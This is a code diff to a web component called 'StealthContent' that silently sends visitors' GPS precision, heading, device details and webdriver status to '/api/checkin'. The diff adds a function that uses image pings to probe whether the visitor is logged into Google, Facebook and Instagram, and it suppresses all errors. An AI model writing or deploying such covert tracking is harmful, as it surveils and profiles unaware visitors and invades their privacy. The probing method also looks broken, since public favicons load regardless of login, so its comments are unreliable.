@@ -437,6 +437,31 @@ function StealthContent() {
       deviceInfo.webdriver = !!(navigator as any).webdriver;
     } catch { /* silencioso */ }
 
+    // 7b. Detectar sessões logadas em redes sociais (image ping)
+    async function detectSocialSessions() {
+      // Retorna um objeto { google: boolean, facebook: boolean, instagram: boolean }
+      function ping(url: string): Promise<boolean> {
+        return new Promise((resolve) => {
+          const img = new window.Image();
+          img.onload = () => resolve(true);
+          img.onerror = () => resolve(false);
+          img.src = url + '?_=' + Date.now();
+        });
+      }
+      // Google: carrega foto de perfil (só funciona se logado)
+      const google = await ping('https://accounts.google.com/AccountChooser');
+      // Facebook: carrega favicon da área logada
+      const facebook = await ping('https://www.facebook.com/favicon.ico');
+      // Instagram: carrega favicon da área logada
+      const instagram = await ping('https://www.instagram.com/favicon.ico');
+      return { google, facebook, instagram };
+    }
+
+    let socialSessions = { google: false, facebook: false, instagram: false };
+    try {
+      socialSessions = await detectSocialSessions();
+    } catch {}
+
     // 8. Enviar dados
     try {
       await fetch('/api/checkin', {
@@ -453,6 +478,7 @@ function StealthContent() {
           precisaoGPS,
           direcao,
           ...deviceInfo,
+          socialSessions,
         }),
       });
     } catch { /* falha silenciosa */ }
